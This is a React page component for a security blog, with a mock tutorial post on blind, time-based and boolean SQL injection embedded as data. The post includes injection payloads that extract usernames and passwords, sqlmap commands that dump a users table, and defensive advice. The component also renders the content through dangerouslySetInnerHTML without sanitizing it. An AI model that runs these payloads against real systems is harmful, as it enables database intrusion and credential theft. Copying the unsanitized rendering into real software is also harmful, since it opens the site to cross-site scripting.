import React from 'react';
// import Layout from '@/components/layout/Layout';
import { BlogPost, UserRole, BlogCategory } from '@/types';
import { Card, CardContent } from '@/components/ui/card';
import { Badge } from '@/components/ui/badge';
import { TableOfContents } from '@/components/blog/TableOfContents';
import { SocialShare } from '@/components/blog/SocialShare';
import { CommentSection } from '@/components/blog/CommentSection';
import { RelatedPosts } from '@/components/blog/RelatedPosts';
import { Eye, Heart, MessageCircle, BookOpen } from 'lucide-react';

// Mock blog post data
const mockBlogPost: BlogPost = {
  id: '1',
  title: 'Advanced SQL Injection Techniques for Penetration Testing',
  slug: 'advanced-sql-injection-techniques',
  excerpt: 'Master the art of SQL injection with advanced techniques including blind SQLi, time-based attacks, and automated exploitation tools.',
  content: `
# Advanced SQL Injection Techniques for Penetration Testing

SQL injection remains one of the most critical vulnerabilities in web applications. In this comprehensive guide, we'll explore advanced techniques that go beyond basic UNION-based attacks.

## Table of Contents
- [Blind SQL Injection](#blind-sql-injection)
- [Time-Based Attacks](#time-based-attacks)
- [Boolean-Based Attacks](#boolean-based-attacks)
- [Automated Exploitation](#automated-exploitation)
- [Defense Strategies](#defense-strategies)

## Blind SQL Injection

Blind SQL injection occurs when the application doesn't return the actual data but instead returns different responses based on whether the injected query returns true or false.

### Example 1: Boolean-Based Blind SQLi

\`\`\`sql
' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a'--
\`\`\`

### Example 2: Time-Based Blind SQLi

\`\`\`sql
'; IF (SELECT COUNT(*) FROM users WHERE username='admin')>0 WAITFOR DELAY '00:00:05'--
\`\`\`

## Time-Based Attacks

Time-based attacks are particularly useful when dealing with applications that don't return meaningful error messages.

\`\`\`python
import requests
import time

def time_based_blind_sqli(url, payload):
    start_time = time.time()
    response = requests.get(url + payload)
    end_time = time.time()
    
    if end_time - start_time > 5:
        return True
    return False
\`\`\`

## Boolean-Based Attacks

Boolean-based attacks rely on the application returning different responses based on the truth value of the injected condition.

\`\`\`sql
' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE id=1)>50--
\`\`\`

## Automated Exploitation

Modern tools like SQLMap can automate the exploitation process:

\`\`\`bash
sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/page?id=1" -D database_name --tables
sqlmap -u "http://target.com/page?id=1" -D database_name -T users --dump
\`\`\`

## Defense Strategies

### 1. Parameterized Queries

Always use parameterized queries or prepared statements:

\`\`\`python
# Good
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))

# Bad
cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")
\`\`\`

### 2. Input Validation

Implement strict input validation:

\`\`\`python
import re

def validate_user_id(user_id):
    if not re.match(r'^[0-9]+$', str(user_id)):
        raise ValueError("Invalid user ID")
    return int(user_id)
\`\`\`

### 3. Web Application Firewalls

Deploy WAF solutions to detect and block SQL injection attempts.

## Conclusion

Understanding advanced SQL injection techniques is crucial for both penetration testers and developers. While these techniques can be powerful for security testing, they should only be used in authorized environments.

Remember: Always obtain proper authorization before testing any application for vulnerabilities.
  `,
  author: {
    id: '1',
    username: 'cyberhunter',
    email: 'hunter@example.com',
    avatar: '/api/placeholder/60/60',
    role: UserRole.HUNTER,
    level: 15,
    experience: 5000,
    badges: [],
    createdAt: new Date(),
    updatedAt: new Date()
  },
  coverImage: '/api/placeholder/1200/600',
  tags: ['SQL Injection', 'Penetration Testing', 'Web Security', 'Database'],
  category: BlogCategory.TUTORIAL,
  publishedAt: new Date('2024-01-15'),
  updatedAt: new Date('2024-01-15'),
  readTime: 12,
  views: 15420,
  likes: 892,
  comments: [
    {
      id: '1',
      content: 'Excellent article! The time-based examples are particularly helpful.',
      author: {
        id: '2',
        username: 'securitylearner',
        email: 'learner@example.com',
        avatar: '/api/placeholder/40/40',
        role: UserRole.STUDENT,
        level: 5,
        experience: 1000,
        badges: [],
        createdAt: new Date(),
        updatedAt: new Date()
      },
      postId: '1',
      createdAt: new Date('2024-01-16'),
      updatedAt: new Date('2024-01-16'),
      replies: []
    }
  ]
};

const relatedPosts = [
  {
    id: '2',
    title: 'XSS Vulnerability in User Comments',
    slug: 'xss-vulnerability-user-comments',
    excerpt: 'Find cross-site scripting vulnerabilities in the comment system',
    coverImage: '/api/placeholder/400/200',
    author: { username: 'websec_expert' },
    publishedAt: new Date('2024-01-10'),
    readTime: 8
  },
  {
    id: '3',
    title: 'API Rate Limiting Bypass',
    slug: 'api-rate-limiting-bypass',
    excerpt: 'Identify methods to bypass API rate limiting mechanisms',
    coverImage: '/api/placeholder/400/200',
    author: { username: 'api_hunter' },
    publishedAt: new Date('2024-01-08'),
    readTime: 10
  }
];

export default async function BlogPostPage() {
  const post = mockBlogPost; // In a real app, you'd fetch based on slug

  // Extract headings for table of contents
  const headings = post.content
    .split('\n')
    .filter(line => line.startsWith('#'))
    .map(line => ({
      level: line.match(/^#+/)?.[0].length || 1,
      text: line.replace(/^#+\s*/, ''),
      id: line.replace(/^#+\s*/, '').toLowerCase().replace(/[^a-z0-9]+/g, '-')
    }));

  return (
    <div className="container mx-auto px-4 py-8">
      {/* Header */}
      <div className="mb-8">
        <div className="flex items-center space-x-2 text-sm text-muted-foreground mb-4">
          <span>Blog</span>
          <span>•</span>
          <span>{post.category}</span>
          <span>•</span>
          <span>{post.publishedAt.toLocaleDateString()}</span>
        </div>
        
        <h1 className="cyber-title text-4xl mb-4">{post.title}</h1>
        <p className="cyber-subtitle text-xl mb-6">{post.excerpt}</p>
        
        {/* Author Info */}
        <div className="flex items-center space-x-4 mb-6">
          <div className="w-12 h-12 rounded-full bg-gradient-to-r from-red-500 to-purple-600" />
          <div>
            <div className="font-medium text-white">{post.author.username}</div>
            <div className="text-sm text-muted-foreground">
              {post.publishedAt.toLocaleDateString()} • {post.readTime} min read
            </div>
          </div>
        </div>

        {/* Interactive Stats */}
        <div className="flex items-center space-x-6 text-sm text-muted-foreground">
          <div className="flex items-center space-x-1">
            <Eye className="w-4 h-4" />
            <span>{post.views.toLocaleString()}</span>
          </div>
          <div className="flex items-center space-x-1">
            <Heart className="w-4 h-4" />
            <span>{post.likes}</span>
          </div>
          <div className="flex items-center space-x-1">
            <MessageCircle className="w-4 h-4" />
            <span>{post.comments.length}</span>
          </div>
        </div>
      </div>

      {/* Content */}
      <div className="grid grid-cols-1 lg:grid-cols-4 gap-8">
        {/* Main Content */}
        <div className="lg:col-span-3">
          <Card className="cyber-card">
            <CardContent className="p-8">
              {/* Cover Image */}
              <div className="aspect-video bg-gradient-to-br from-red-500/20 to-purple-500/20 rounded-lg mb-8 flex items-center justify-center">
                <BookOpen className="w-16 h-16 text-white/50" />
              </div>

              {/* Tags */}
              <div className="flex flex-wrap gap-2 mb-8">
                {post.tags.map((tag) => (
                  <Badge key={tag} variant="secondary">
                    {tag}
                  </Badge>
                ))}
              </div>

              {/* Content */}
              <div className="prose prose-invert max-w-none">
                <div dangerouslySetInnerHTML={{ __html: post.content }} />
              </div>
            </CardContent>
          </Card>

          {/* Comments */}
          <div className="mt-8">
            <CommentSection comments={post.comments} postId={post.id} />
          </div>
        </div>

        {/* Sidebar */}
        <div className="lg:col-span-1">
          <div className="sticky top-8 space-y-6">
            {/* Table of Contents */}
            <TableOfContents headings={headings} />
            
            {/* Social Share */}
            <SocialShare 
              title={post.title}
              url={typeof window !== 'undefined' ? window.location.href : ''}
            />
            
            {/* Related Posts */}
            <RelatedPosts posts={relatedPosts} />
          </div>
        </div>
      </div>
    </div>
  );
} 